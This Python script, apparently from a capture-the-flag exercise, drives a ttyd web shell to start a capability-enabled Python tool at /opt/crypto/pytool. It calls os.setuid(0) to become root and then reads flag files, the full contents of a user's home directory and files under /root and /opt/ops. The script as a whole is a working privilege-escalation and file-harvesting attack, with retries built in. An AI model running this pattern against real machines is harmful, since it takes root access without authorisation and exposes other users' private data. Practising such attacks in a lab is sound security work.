"""Confirm the Dangerous Capability flag and grab remaining artifacts."""
import asyncio
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ttyd_client import Shell  # noqa: E402

LINES = [
    "import os, pwd, glob, subprocess as sp",
    "os.setuid(0)",
    # 1. the capability-themed flag, exact bytes + owner
    "print('SPOOKYBOI', repr(open('/home/spookyboi/flag.txt','rb').read()))",
    # 2. spookyboi's home contents (may hold the explanation)
    "print('LIST', sp.run(['ls','-laR','/home/spookyboi/'],capture_output=True,text=True).stdout)",
    "print('READNOTES', sp.run(['sh','-c','cat /home/spookyboi/* 2>/dev/null'],"
    "capture_output=True,text=True).stdout)",
    # 3. everything else on the box, for completeness
    "print('ROOTFLAG', repr(open('/root/flag.txt','rb').read()))",
    "print('KINGMAKER', open('/root/kingmaker.txt').read())",
    "print('LEVERAGE', open('/opt/ops/leverage.txt').read())",
]


async def body(sh):
    await sh.read(2.5)
    await sh.send("/opt/crypto/pytool")
    await sh.read(3.5)
    for line in LINES:
        await sh.send(line)
        print(await sh.read(10.0))
    await sh.send("exit()")
    await sh.read(1.5)


async def amain():
    for attempt in range(6):
        try:
            async with Shell(cols=160, rows=60) as sh:
                await body(sh)
                return
        except Exception as e:
            print(f"[attempt {attempt + 1}] {type(e).__name__}: {e}", flush=True)
            await asyncio.sleep(5)
    print("[!] all attempts failed", flush=True)


asyncio.run(amain())
